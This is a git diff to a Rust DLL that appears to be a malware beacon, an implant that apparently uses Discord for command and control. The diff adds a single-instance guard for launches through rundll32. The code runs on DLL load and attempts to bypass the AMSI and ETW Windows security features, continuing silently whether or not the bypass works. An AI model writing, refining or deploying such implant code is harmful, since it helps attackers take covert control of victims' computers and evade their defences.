@@ -18,8 +18,10 @@ mod error;
 #[cfg(windows)]
 mod bypass;
 
-use std::sync::atomic::AtomicBool;
+use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::Arc;
+use std::thread;
+use std::time::Duration;
 
 use config::Config;
 use discord::DiscordClient;
@@ -29,17 +31,34 @@ use error::{BeaconError, Result};
 // MAIN BEACON LOGIC
 // ============================================================================
 
+// Global flag to prevent multiple beacon instances in the same process
+// (e.g. when using rundll32 which calls DllMain AND the export)
+static BEACON_RUNNING: AtomicBool = AtomicBool::new(false);
+
 /// Main beacon execution flow
 /// Called from DllMain in a separate thread
 pub fn run_beacon() -> Result<()> {
+    // Check if beacon is already running
+    if BEACON_RUNNING
+        .compare_exchange(false, true, Ordering::SeqCst, Ordering::SeqCst)
+        .is_err()
+    {
+        // Already running in another thread.
+        // If this is called from an export (like Start), we must block to keep the process alive.
+        // If this is called from DllMain's thread, it's redundant but blocking is fine (just a wasted thread).
+        loop {
+            thread::sleep(Duration::from_secs(60));
+        }
+    }
+
     // Avoid println! in DLL - use OutputDebugString or similar in production
     // For now we keep them for debugging
-    
+
     #[cfg(windows)]
     {
         // Attempt security bypass (AMSI/ETW)
         match bypass::setup_bypass() {
-            Ok(_) => {} // Success - silently continue
+            Ok(_) => {}   // Success - silently continue
             Err(_e) => {} // Warning - continue anyway
         }
     }
@@ -92,7 +111,7 @@ pub extern "system" fn DllMain(
         std::thread::spawn(|| {
             // Small delay to let the loader finish
             std::thread::sleep(std::time::Duration::from_millis(100));
-            
+
             let _ = run_beacon();
         });
     }
